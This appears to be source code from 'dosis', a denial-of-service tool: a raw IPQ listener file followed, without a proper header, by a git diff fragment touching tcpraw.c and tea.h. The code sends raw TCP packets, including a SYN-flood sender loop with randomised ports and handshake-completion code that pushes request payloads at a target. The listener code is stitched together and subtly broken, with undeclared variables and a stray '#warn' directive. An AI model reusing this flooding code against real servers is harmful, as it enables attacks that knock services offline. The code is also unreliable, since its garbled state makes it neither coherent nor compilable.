/*****************************************************************************
 * listener.c
 *
 * Raw IPQ listener (used by raw listeners like tcpopen).
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#if 0
#include "dosis.h"
#include "dosconfig.h"
#include "tea.h"
#include "tcpopen.h"
#include "lnet.h"
#include "pthreadex.h"
#include "log.h"
#include "ip.h"
#endif

typedef struct _tag_IPQLISTENER_CFG {
  unsigned    npackets;
  char       *req;
  unsigned    req_size;
} IPQLISTENER_CFG;

#define ip_protocol(x) (((struct iphdr *) (x))->protocol)
#define ip_header(x)   ((struct iphdr *)  (x))
#define tcp_header(x)  ((struct tcphdr *) ((x) \
                       + (((struct iphdr *) (x))->ihl << 2)))

/*****************************************************************************
 * LISTENER THREAD
 *****************************************************************************/

static void tea_timer_listener_thread(THREAD_WORK *tw)
{
  int r;
  ipqex_msg_t msg;
  IPQLISTENER_CFG *ic = (IPQLISTENER_CFG *) tw->data;

  /* get packets and classify */
  while(!cfg.finalize)
  {
    if((status = ipqex_msg_read(&msg, 0)) <= 0)
    {
      if(status < 0)
        ERR("Error reading from IPQ: %s (errno %s)", ipq_errstr(), strerror(errno));
      continue;
    }

    tw = tea_timer_search_listener(m->b, m->s);
    if(tw)
    {
      pthread_setcanceltype(PTHREAD_CANCEL_DEFERRED, NULL);
      tea_timer_push_msg(tw, m->b, m->s);
      pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
      pthread_testcancel();
    } else {
#warn "decide here the best policy for not handled packets in IPQ."
      if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
        ERR("Cannot DROP IPQ packet.");
#if 0
      /* policy: accept anything unknown */
      if(ipqex_set_verdict(&tw->msg, NF_ACCEPT) <= 0)
        ERR("[LL_%02u] Cannot ACCEPT IPQ packet.", tw->w->id);
#endif
    }
  }

  /* finish him */
  pthread_cleanup_pop(1);
  pthread_exit(NULL);
}

static void tea_timer_listener_thread_cleanup(void *x)
{
  /* finalize ipq */
  ipqex_destroy(&attack_tcpopen__ipq);
}

static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
{
  IPQLISTENER_CFG *tc = (IPQLISTENER_CFG *) tw->data;

  /* initialize specialized work thread data */
  if(tc == NULL)
  {
    if((tc = calloc(1, sizeof(IPQLISTENER_CFG))) == NULL)
      D_FAT("[%02d] No memory for IPQLISTENER_CFG.", tw->id);
    tw->data = (void *) tc;

    /* initialize ipq */
    DBG("[%02u] Initializing ipq.", tw->id);
    if(ipqex_init(&attack_tcpopen__ipq, BUFSIZE))
      FAT("  !! Cannot initialize IPQ.");
  }

  return 0;
}


  /* flag that will keep attack threads waiting for work */

@@ -59,118 +59,66 @@ static pthreadex_flag_t    attack_flag;
-                         NULL, 0);
-          ln_send_packet(&(tw->lnc),
-                         &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                         &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
-                         TH_ACK | TH_PUSH,
-                         ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
-                         ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
-                         ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
-                         (char *) tw->cfg.req, tw->cfg.req_size);
-        }
-      } else
-        /* policy: accept anything unknown */
-        if(ipqex_set_verdict(&tw->msg, NF_ACCEPT) <= 0)
-          ERR("[LL_%02u] Cannot ACCEPT IPQ packet.", tw->w->id);
-    }
-  }
-}
-
-/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * SENDER THREADS
- *   This thread processes all packets coming from NETFILTER/IP_QUEUE and
- *   add more packages to the queue when we have to answer to some SYN+ACK
- *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
-
-static void sender_thread(TCPOPEN_WORK *tw)
-{
-  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
-  int npackets, i;
-
-  DBG("[SS_%02u] Started sender thread", tw->w->id);
-
-  /* set how many packets will be sent by this thread */
-  npackets = tw->cfg.npackets;
-
-  /* ATTACK */
-  while(!cfg.finalize)
-  {
-    /* wait for work */
-    pthreadex_flag_wait(&attack_flag);
-
-    /* build TCP packet with payload (if requested) */
-    DBG("[SS_%02u] Sending %d packets...", tw->w->id, npackets);
-    for(i = 0; i < npackets; i++)
-    {
-      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
-      ln_send_packet(&tw->lnc,
-                     &tw->cfg.shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
-                     &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
-                     TH_SYN, 13337,
-                     seq, 0,
-                     NULL, 0);
+        /* send handshake and data TCP packet */
+        DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
+        ln_send_packet(&(tw->lnc),
+                       &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                       &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
+                       TH_ACK,
+                       ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
+                       NULL, 0);
+        ln_send_packet(&(tw->lnc),
+                       &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                       &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
+                       TH_ACK | TH_PUSH,
+                       ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
+                       (char *) tw->cfg.req, tw->cfg.req_size);
+      }
     }
   }
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * GENERIC HHTP THREAD
+ * GENERIC HTTP THREAD
  *   This thread specializes in different tasks depending on thread number
  *     0 - listener
  *     x - sender
diff --git a/src/dosis/tcpraw.c b/src/dosis/tcpraw.c
index ce5a90a..69e41fa 100644
--- a/src/dosis/tcpraw.c
+++ b/src/dosis/tcpraw.c
@@ -1,5 +1,5 @@
 /*****************************************************************************
- * tcpopen.c
+ * tcpraw.c
  *
  * DoS on TCP servers by raw tcp packets (synflood?).
  *
@@ -49,9 +49,9 @@ typedef struct _tag_TCPOPEN_WORK {
   LN_CONTEXT    lnc;
   ipqex_msg_t   msg;
   TCPOPEN_CFG   cfg;
-} TCPOPEN_WORK;
+} TCPRAW_WORK;
 
-static void send_packets(TCPOPEN_WORK *tw)
+static void send_packets(TCPRAW_WORK *tw)
 {
   pthreadex_timer_t timer;
   unsigned int seq = libnet_get_prand(LIBNET_PRu32);
@@ -99,7 +99,7 @@ static void send_packets(TCPOPEN_WORK *tw)
  *     x - sender
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-static void tcpraw__thread_cleanup(TCPOPEN_WORK *tw)
+static void tcpraw__thread_cleanup(TCPRAW_WORK *tw)
 {
   /* collect libnet data */
   ln_destroy_context(&(tw->lnc));
@@ -110,7 +110,7 @@ static void tcpraw__thread_cleanup(TCPOPEN_WORK *tw)
 static void tcpraw__thread_launch(THREAD_WORK *w)
 {
   int r;
-  TCPOPEN_WORK tw;
+  TCPRAW_WORK tw;
 
   /* initialize specialized work thread data */
   memset(&tw, 0, sizeof(tw));
@@ -133,24 +133,13 @@ static void tcpraw__thread_launch(THREAD_WORK *w)
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * GO4WORK
- *   Function to enqueue SYN packets.
+ * TCPRAW TEA OBJECT
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-void attack_tcpopen(void)
-{
-  /* launch attack */
-  launch_thread(attack_tcpopen__thread);
-}
-
-typedef struct _tag_TEA_OBJECT {
-  void (*thread_launch)(THREAD_WORK *tw);
-  void (*thread_stop)(THREAD_WORK *tw);
-  int  (*configure)(THREAD_WORK *tw);
-} TEA_OBJECT;
-
 TEA_OBJECT teaTCPRAW = {
   tcpraw__thread_launch,
+  NULL,
   tcpraw__thread_stop,
   tcpraw__configure,
 };
+
diff --git a/src/dosis/tea.h b/src/dosis/tea.h
index 52f67bb..1916c19 100644
--- a/src/dosis/tea.h
+++ b/src/dosis/tea.h
@@ -28,6 +28,18 @@
 
 #include "pthreadex.h"
 
+typedef struct _tag_TEA_MSG {
+  unsigned int   s;
+  unsigned char *b;
+} TEA_MSG;
+
+typedef struct _tag_TEA_OBJECT {
+  void (*launch)(THREAD_WORK *tw);
+  void (*listen)(THREAD_WORK *tw, TEA_MSG *msg);
+  void (*stop)(THREAD_WORK *tw);
+  int  (*configure)(THREAD_WORK *tw);
+} TEA_OBJECT;
+
 typedef struct _tag_THREAD_WORK {
   int                  id;
   pthread_t            pthread_id;
